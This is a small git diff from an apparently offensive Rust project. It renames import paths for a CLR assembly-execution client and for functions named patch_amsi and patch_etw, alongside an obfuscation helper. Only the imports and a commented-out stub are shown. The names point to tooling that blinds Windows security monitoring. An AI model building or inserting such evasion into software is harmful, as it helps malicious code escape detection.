@@ -2,8 +2,8 @@ use clroxide::clr::Clr;
 use fmtools::format; // using obfstr to obfuscate
 use std::string::ToString;
 
-use crate::internal::client::Client;
-use crate::internal::patches::{patch_amsi, patch_etw};
+use crate::app::client::Client;
+use crate::app::patches::{patch_amsi, patch_etw};
 
 // pub(crate) fn clr_exec_with_console(assembly: &[u8], args: &str) -> Result<String, String> {
 //     !todo!("clr_exec_with_console")
